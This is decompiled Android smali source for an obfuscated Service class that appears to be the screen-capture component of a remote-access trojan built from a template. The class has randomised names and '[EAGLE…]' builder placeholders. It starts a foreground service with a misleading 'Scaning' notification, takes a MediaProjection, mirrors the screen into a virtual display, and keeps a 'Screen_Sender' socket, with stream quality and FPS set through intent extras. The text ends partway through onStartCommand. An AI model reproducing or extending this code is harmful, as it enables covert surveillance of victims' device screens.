.class public L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;
.super Landroid/app/Service;
.source "umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture.java"


# static fields
.field static final ACTION_RECORD:Ljava/lang/String; = "[EAGLE_PACKAGE_NAME].RECORD"

.field static final ACTION_SHUTDOWN:Ljava/lang/String; = "[EAGLE_PACKAGE_NAME].SHUTDOWN"

.field private static final CHANNEL_WHATEVER:Ljava/lang/String; = "Scaning"

.field static final EXTRA_RESULT_CODE:Ljava/lang/String; = "resultCode"

.field static final EXTRA_RESULT_INTENT:Ljava/lang/String; = "resultIntent"

.field public static FPS:I = 0x0

.field public static ISON:Z = false

.field private static final NOTIFY_ID:I = 0x26b2

.field public static PID:Ljava/lang/String; = null

.field public static Q:I = 0x0

.field public static Resolutions:Ljava/lang/String; = null

.field static final VIRT_DISPLAY_FLAGS:I = 0x2

.field public static ctd:Z

.field static display_height:Ljava/lang/String;

.field static display_width:Ljava/lang/String;

.field private static projection:Landroid/media/projection/MediaProjection;

.field public static syc:Ljava/lang/Object;

.field public static usd:Z

.field private static vdisplay:Landroid/hardware/display/VirtualDisplay;


# instance fields
.field public Screen_Sender:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/SecondarySocket;

.field _IDD:I

.field public bts:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List<",
            "[B>;"
        }
    .end annotation
.end field

.field private handler:Landroid/os/Handler;

.field private final handlerThread:Landroid/os/HandlerThread;

.field private it:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;

.field private mgr:Landroid/media/projection/MediaProjectionManager;

.field mynotify:Landroid/app/Notification;

.field private resultCode:I

.field private resultData:Landroid/content/Intent;

.field private wmgr:Landroid/view/WindowManager;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 206
    new-instance v0, Ljava/lang/Object;

    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    sput-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->syc:Ljava/lang/Object;

    return-void
.end method

.method public constructor <init>()V
    .locals 3

    .line 41
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 56
    new-instance v0, Landroid/os/HandlerThread;

    const-string v1, "ScreenThread"

    const/4 v2, -0x2

    invoke-direct {v0, v1, v2}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;I)V

    iput-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->handlerThread:Landroid/os/HandlerThread;

    const/4 v0, 0x0

    .line 65
    iput-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->Screen_Sender:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/SecondarySocket;

    const/16 v0, 0x1a14

    .line 68
    iput v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->_IDD:I

    .line 209
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->bts:Ljava/util/List;

    return-void
.end method

.method static synthetic access$000()Landroid/hardware/display/VirtualDisplay;
    .locals 1

    .line 41
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->vdisplay:Landroid/hardware/display/VirtualDisplay;

    return-object v0
.end method

.method public static cancelnotification(Landroid/content/Context;I)V
    .locals 1

    const-string v0, "notification"

    .line 72
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Landroid/app/NotificationManager;

    .line 73
    invoke-virtual {p0, p1}, Landroid/app/NotificationManager;->cancel(I)V

    return-void
.end method

.method private startCapture(Landroid/content/Context;)V
    .locals 9

    .line 339
    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->mgr:Landroid/media/projection/MediaProjectionManager;

    iget v1, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->resultCode:I

    iget-object v2, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->resultData:Landroid/content/Intent;

    invoke-virtual {v0, v1, v2}, Landroid/media/projection/MediaProjectionManager;->getMediaProjection(ILandroid/content/Intent;)Landroid/media/projection/MediaProjection;

    move-result-object v0

    sput-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->projection:Landroid/media/projection/MediaProjection;

    .line 340
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/MySettings;->ScreenWidth:Ljava/lang/String;

    const-string v1, "720"

    invoke-static {p1, v0, v1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/MySettings;->read(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->display_width:Ljava/lang/String;

    .line 341
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/MySettings;->ScreenHight:Ljava/lang/String;

    const-string v1, "1080"

    invoke-static {p1, v0, v1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/MySettings;->read(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    sput-object p1, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->display_height:Ljava/lang/String;

    .line 342
    new-instance p1, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;

    invoke-direct {p1, p0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;-><init>(L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;)V

    iput-object p1, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->it:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;

    .line 343
    new-instance p1, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture$2;

    invoke-direct {p1, p0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture$2;-><init>(L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;)V

    .line 363
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->projection:Landroid/media/projection/MediaProjection;

    const-string v1, "Shooters"

    iget-object v2, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->it:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;

    .line 364
    invoke-virtual {v2}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->getWidth()I

    move-result v2

    iget-object v3, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->it:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;

    invoke-virtual {v3}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->getHeight()I

    move-result v3

    .line 365
    invoke-virtual {p0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->getResources()Landroid/content/res/Resources;

    move-result-object v4

    invoke-virtual {v4}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object v4

    iget v4, v4, Landroid/util/DisplayMetrics;->densityDpi:I

    const/4 v5, 0x2

    iget-object v6, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->it:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;

    .line 366
    invoke-virtual {v6}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/HandleScreenCap;->getSurface()Landroid/view/Surface;

    move-result-object v6

    const/4 v7, 0x0

    iget-object v8, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->handler:Landroid/os/Handler;

    .line 363
    invoke-virtual/range {v0 .. v8}, Landroid/media/projection/MediaProjection;->createVirtualDisplay(Ljava/lang/String;IIIILandroid/view/Surface;Landroid/hardware/display/VirtualDisplay$Callback;Landroid/os/Handler;)Landroid/hardware/display/VirtualDisplay;

    move-result-object v0

    sput-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->vdisplay:Landroid/hardware/display/VirtualDisplay;

    .line 368
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->projection:Landroid/media/projection/MediaProjection;

    iget-object v1, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->handler:Landroid/os/Handler;

    invoke-virtual {v0, p1, v1}, Landroid/media/projection/MediaProjection;->registerCallback(Landroid/media/projection/MediaProjection$Callback;Landroid/os/Handler;)V

    return-void
.end method

.method public static stopCapture()V
    .locals 1

    .line 320
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->projection:Landroid/media/projection/MediaProjection;

    if-eqz v0, :cond_0

    .line 325
    :try_start_0
    invoke-virtual {v0}, Landroid/media/projection/MediaProjection;->stop()V

    .line 326
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->vdisplay:Landroid/hardware/display/VirtualDisplay;

    invoke-virtual {v0}, Landroid/hardware/display/VirtualDisplay;->release()V

    const/4 v0, 0x0

    .line 327
    sput-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->projection:Landroid/media/projection/MediaProjection;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_0
    return-void
.end method


# virtual methods
.method getHandler()Landroid/os/Handler;
    .locals 1

    .line 316
    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->handler:Landroid/os/Handler;

    return-object v0
.end method

.method getWindowManager()Landroid/view/WindowManager;
    .locals 1

    .line 312
    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->wmgr:Landroid/view/WindowManager;

    return-object v0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    .line 202
    new-instance p1, Ljava/lang/IllegalStateException;

    const-string v0, "Binding not supported."

    invoke-direct {p1, v0}, Ljava/lang/IllegalStateException;-><init>(Ljava/lang/String;)V

    throw p1
.end method

.method public onCreate()V
    .locals 3

    .line 77
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 80
    :try_start_0
    invoke-virtual {p0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    .line 82
    iget-object v1, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->mynotify:Landroid/app/Notification;

    if-nez v1, :cond_0

    .line 85
    invoke-static {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/NotificationUtils;->getInstance(Landroid/content/Context;)L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/NotificationUtils;

    move-result-object v1

    .line 86
    invoke-virtual {v1, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/NotificationUtils;->createNotification(Landroid/content/Context;)Landroid/app/Notification;

    move-result-object v0

    iput-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->mynotify:Landroid/app/Notification;

    .line 88
    :cond_0
    sget v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->NOTIFICATION_ID:I

    iget-object v1, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->mynotify:Landroid/app/Notification;

    invoke-virtual {p0, v0, v1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->startForeground(ILandroid/app/Notification;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    nop

    .line 92
    :goto_0
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1d

    if-lt v0, v1, :cond_1

    .line 93
    iget v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->_IDD:I

    iget-object v1, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->mynotify:Landroid/app/Notification;

    const/16 v2, 0x20

    invoke-virtual {p0, v0, v1, v2}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->startForeground(ILandroid/app/Notification;I)V

    goto :goto_1

    .line 96
    :cond_1
    iget v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->_IDD:I

    iget-object v1, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->mynotify:Landroid/app/Notification;

    invoke-virtual {p0, v0, v1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->startForeground(ILandroid/app/Notification;)V

    :goto_1
    :try_start_1
    const-string v0, "media_projection"

    .line 100
    invoke-virtual {p0, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/media/projection/MediaProjectionManager;

    iput-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->mgr:Landroid/media/projection/MediaProjectionManager;

    const-string v0, "window"

    .line 101
    invoke-virtual {p0, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    iput-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->wmgr:Landroid/view/WindowManager;

    .line 103
    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->handlerThread:Landroid/os/HandlerThread;

    invoke-virtual {v0}, Landroid/os/HandlerThread;->start()V

    .line 104
    new-instance v0, Landroid/os/Handler;

    iget-object v1, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->handlerThread:Landroid/os/HandlerThread;

    invoke-virtual {v1}, Landroid/os/HandlerThread;->getLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    iput-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->handler:Landroid/os/Handler;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    return-void
.end method

.method public onDestroy()V
    .locals 0

    .line 194
    invoke-static {}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->stopCapture()V

    .line 196
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 2

    .line 118
    :try_start_0
    iget-object p2, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->mynotify:Landroid/app/Notification;

    if-nez p2, :cond_0

    .line 120
    invoke-virtual {p0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->getApplicationContext()Landroid/content/Context;

    move-result-object p2

    .line 121
    invoke-static {p2}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/NotificationUtils;->getInstance(Landroid/content/Context;)L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/NotificationUtils;

    move-result-object p3

    .line 122
    invoke-virtual {p3, p2}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/NotificationUtils;->createNotification(Landroid/content/Context;)Landroid/app/Notification;

    move-result-object p2

    iput-object p2, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->mynotify:Landroid/app/Notification;

    .line 126
    :cond_0
    sget p2, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->NOTIFICATION_ID:I

    iget-object p3, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->mynotify:Landroid/app/Notification;

    invoke-virtual {p0, p2, p3}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->startForeground(ILandroid/app/Notification;)V

    .line 127
    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p2
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    const/high16 p3, 0x10000000

    const-string v0, "[EAGLE_PACKAGE_NAME].RECORD"

    if-nez p2, :cond_2

    :try_start_1
    const-string p2, "resultCode"

    const/16 v1, 0x539

    .line 131
    invoke-virtual {p1, p2, v1}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result p2

    iput p2, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->resultCode:I

    const-string p2, "resultIntent"

    .line 132
    invoke-virtual {p1, p2}, Landroid/content/Intent;->getParcelableExtra(Ljava/lang/String;)Landroid/os/Parcelable;

    move-result-object p2

    check-cast p2, Landroid/content/Intent;

    iput-object p2, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->resultData:Landroid/content/Intent;

    const-string p2, "Q"

    const/16 v1, 0xa

    .line 133
    invoke-virtual {p1, p2, v1}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result p2

    sput p2, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->Q:I

    const-string p2, "F"

    const/4 v1, 0x5

    .line 134
    invoke-virtual {p1, p2, v1}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result p2

    sput p2, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->FPS:I

    const-string p2, "P"

    .line 135
    invoke-virtual {p1, p2}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    sput-object p2, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->PID:Ljava/lang/String;

    const-string p2, "R"

    .line 136
    invoke-virtual {p1, p2}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    sput-object p1, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->Resolutions:Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 140
    :catch_0
    :try_start_2
    new-instance p1, Landroid/content/Intent;

    const-class p2, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;

    invoke-direct {p1, p0, p2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 142
    invoke-virtual {p1, v0}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object p1

    .line 143
    invoke-virtual {p1, p3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 146
    sget p2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 p3, 0x1a

    if-lt p2, p3, :cond_1

    .line 147
    invoke-virtual {p0, p1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0

    .line 150
    :cond_1
